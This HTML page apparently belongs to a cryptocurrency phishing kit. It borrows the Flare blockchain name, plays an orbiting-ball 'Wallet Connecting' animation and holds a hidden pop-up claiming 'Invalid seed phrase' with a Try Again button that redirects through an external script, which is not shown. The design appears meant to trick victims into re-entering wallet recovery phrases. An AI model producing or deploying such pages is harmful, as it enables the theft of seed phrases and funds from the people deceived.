<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="img/Logo-.png" type="image/x-icon">
    <title>Flare: The blockchain for data</title>
    <style>
  @keyframes rollingOrbit {
    0% {
      transform: 
        rotate(0deg) 
        translateX(100px) 
        rotate(0deg);
    }
    100% {
      transform: 
        rotate(360deg) 
        translateX(100px) 
        rotate(-360deg);
    }
  }

  .orbital-container {
    position: relative;
    width: 300px;
    height: 300px;
    margin: 2rem auto;
  }

  .central-ball {
    position: absolute;
    width: 80px;
    height: 80px;
    background: linear-gradient(145deg, #5231D4, #3a1fa8);
    border-radius: 50%;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    box-shadow: 0 10px 25px rgba(82, 49, 212, 0.5);
    z-index: 10;
  }

  .rolling-ball {
    position: absolute;
    width: 40px;
    height: 40px;
    background: linear-gradient(145deg, #7BF5FB, #00c6fb);
    border-radius: 50%;
    top: 50%;
    left: 50%;
    animation: rollingOrbit 6s linear infinite;
    box-shadow: 0 5px 15px rgba(123, 245, 251, 0.6);
  }

  /* Staggered balls */
  .rolling-ball:nth-child(2) {
    animation-delay: -1s;
    background: linear-gradient(145deg, #FF6B6B, #ff8e8e);
  }
  .rolling-ball:nth-child(3) {
    animation-delay: -2s;
    background: linear-gradient(145deg, #4ECDC4, #88f7f2);
  }
  .rolling-ball:nth-child(4) {
    animation-delay: -3s;
    background: linear-gradient(145deg, #FFE66D, #fff4b3);
  }
    </style>
</head>
   
<body class="px-8 relative flex items-center justify-center min-h-screen bg-gradient-to-b from-[#4F4F4F] to-[#000000]">
    <div class="flex items-center flex-col lg:gap-2">
        <div class="orbital-container">
        <div class="central-ball"></div>
        <div class="rolling-ball"></div>
        <div class="rolling-ball"></div>
        <div class="rolling-ball"></div>
        </div>
        <p class="font-semibold pt-4 text-gray-400 text-2xl ">Wallet Connecting.....</p>
    </div>


    <div id="errorForm" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-gradient-to-b from-[#4F4F4F] to-[#000000] bg-opacity-95">
        <div class="bg-white rounded-lg shadow-lg p-6 w-[90%] max-w-md text-center">
            <p class="text-sm font-semibold text-gray-700 mb-4">Invalid seed phrase.</p>
            <p class="text-xs text-black mb-6">Please check your input and try again</p>
            <button 
            onclick="redirect()" 
            class="bg-[#696001] px-6 py-2 rounded-full text-white text-sm hover:bg-[#575000] transition"
            >
            Try Again
            </button>
        </div>
    </div>

</body>
<script src="error.js"></script>
</html>
